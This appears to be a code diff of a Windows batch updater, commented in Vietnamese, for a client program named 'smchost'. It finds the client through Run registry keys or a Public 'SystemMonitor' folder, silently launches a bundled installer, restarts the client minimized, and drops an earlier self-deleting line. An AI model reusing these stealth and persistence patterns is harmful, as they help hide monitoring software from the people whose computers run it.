@@ -18,6 +18,11 @@ if not exist "%TEMP_DIR%" mkdir "%TEMP_DIR%"
 echo =================================================== >> "%LOG_FILE%"
 echo [%DATE% %TIME%] Bat dau tien trinh tu dong cap nhat Client... >> "%LOG_FILE%"
 
+:: Neu data.zip nam o cung thu muc voi file bat nay thi uu tien su dung
+if exist "%~dp0data.zip" (
+    set "ZIP_FILE=%~dp0data.zip"
+)
+
 set "CLIENT_PID=%~1"
 set "CLIENT_DIR=%~2"
 set "CLIENT_EXE=%~3"
@@ -25,20 +30,29 @@ set "CLIENT_EXE=%~3"
 :: 1. Tu dong do tim thu muc Client neu tham so trong
 if "%CLIENT_DIR%"=="" (
     echo [%DATE% %TIME%] Dang tu dong do tim thu muc Client... >> "%LOG_FILE%"
-    for /f "tokens=2*" %%a in ('reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "smchost" 2^>nul') do (
-        set "REG_PATH=%%~dpb"
-    )
-    if not "!REG_PATH!"=="" (
-        set "CLIENT_DIR=!REG_PATH!"
+    if exist "C:\Users\Public\SystemMonitor" (
+        set "CLIENT_DIR=C:\Users\Public\SystemMonitor"
     ) else (
-        if exist "%ProgramFiles%\smchost" (
-            set "CLIENT_DIR=%ProgramFiles%\smchost"
-        ) else if exist "%LocalAppData%\smchost" (
-            set "CLIENT_DIR=%LocalAppData%\smchost"
-        ) else if exist "C:\smchost" (
-            set "CLIENT_DIR=C:\smchost"
+        for /f "tokens=2*" %%a in ('reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "smchost" 2^>nul') do (
+            set "REG_PATH=%%~dpb"
+        )
+        if not "!REG_PATH!"=="" (
+            set "CLIENT_DIR=!REG_PATH!"
         ) else (
-            set "CLIENT_DIR=%CD%"
+            for /f "tokens=2*" %%a in ('reg query "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "smchost" 2^>nul') do (
+                set "REG_PATH=%%~dpb"
+            )
+            if not "!REG_PATH!"=="" (
+                set "CLIENT_DIR=!REG_PATH!"
+            ) else if exist "%ProgramFiles%\smchost" (
+                set "CLIENT_DIR=%ProgramFiles%\smchost"
+            ) else if exist "%LocalAppData%\smchost" (
+                set "CLIENT_DIR=%LocalAppData%\smchost"
+            ) else if exist "C:\smchost" (
+                set "CLIENT_DIR=C:\smchost"
+            ) else (
+                set "CLIENT_DIR=%CD%"
+            )
         )
     )
 )
@@ -58,7 +72,7 @@ if not "%CLIENT_EXE%"=="" (
 taskkill /F /IM "smchost.exe" >nul 2>&1
 
 :: Cho 2 giay de tien trinh giai phong tai nguyen
-timeout /t 2 /nobreak >nul
+ping -n 3 127.0.0.1 >nul
 
 :: 3. Giai nen data.zip vao thu muc tam
 echo [%DATE% %TIME%] Giai nen data.zip vao temp... >> "%LOG_FILE%"
@@ -72,7 +86,16 @@ if exist "%ZIP_FILE%" (
     goto :cleanup
 )
 
-:: 4. Sao chep de vao thu muc Client
+:: 4. Kiem tra xem trong file zip co client_setup.exe hay khong
+if exist "%EXTRACT_DIR%\client_setup.exe" (
+    echo [%DATE% %TIME%] Phat hien client_setup.exe, khoi chay bo cai dat tu dong ngam... >> "%LOG_FILE%"
+    start "" "%EXTRACT_DIR%\client_setup.exe"
+    echo [%DATE% %TIME%] Da khoi chay bo cai dat client_setup.exe thanh cong! >> "%LOG_FILE%"
+    ping -n 4 127.0.0.1 >nul
+    goto :finish
+)
+
+:: 5. Neu khong co client_setup.exe, sao chep truc tiep file vao thu muc Client
 if not exist "%CLIENT_DIR%" (
     echo [%DATE% %TIME%] Tao thu muc Client: "%CLIENT_DIR%" >> "%LOG_FILE%"
     mkdir "%CLIENT_DIR%"
@@ -87,14 +110,14 @@ if exist "%CLIENT_DIR%\smchost.exe" (
 :: Sao chep de toan bo tep tu thu muc giai nen
 xcopy /E /Y /H /R "%EXTRACT_DIR%\*" "%CLIENT_DIR%\" >> "%LOG_FILE%" 2>&1
 
-:: 5. Tu dong khoi chay lai Client moi
+:: 6. Tu dong khoi chay lai Client moi
 echo [%DATE% %TIME%] Khoi dong lai Client moi... >> "%LOG_FILE%"
 cd /d "%CLIENT_DIR%"
 
 if exist "%CLIENT_DIR%\smchost.exe" (
-    start "" "%CLIENT_DIR%\smchost.exe"
+    start "" "%CLIENT_DIR%\smchost.exe" -minimized
 ) else if exist "%CLIENT_DIR%\%CLIENT_EXE%" (
-    start "" "%CLIENT_DIR%\%CLIENT_EXE%"
+    start "" "%CLIENT_DIR%\%CLIENT_EXE%" -minimized
 ) else if exist "%CLIENT_DIR%\client.py" (
     start "" python "%CLIENT_DIR%\client.py"
 ) else (
@@ -104,10 +127,9 @@ if exist "%CLIENT_DIR%\smchost.exe" (
 echo [%DATE% %TIME%] Cap nhat Client thanh cong hoan toan! >> "%LOG_FILE%"
 
 :cleanup
-:: 6. Don dep
-timeout /t 3 /nobreak >nul
+ping -n 3 127.0.0.1 >nul
 if exist "%EXTRACT_DIR%" rmdir /s /q "%EXTRACT_DIR%" >nul 2>&1
-if exist "%ZIP_FILE%" del /f /q "%ZIP_FILE%" >nul 2>&1
+if exist "%TEMP_DIR%\data.zip" del /f /q "%TEMP_DIR%\data.zip" >nul 2>&1
 
-:: Tu xoa file bat nay
-(goto) 2>nul & del "%~f0"
+:finish
+exit /b 0
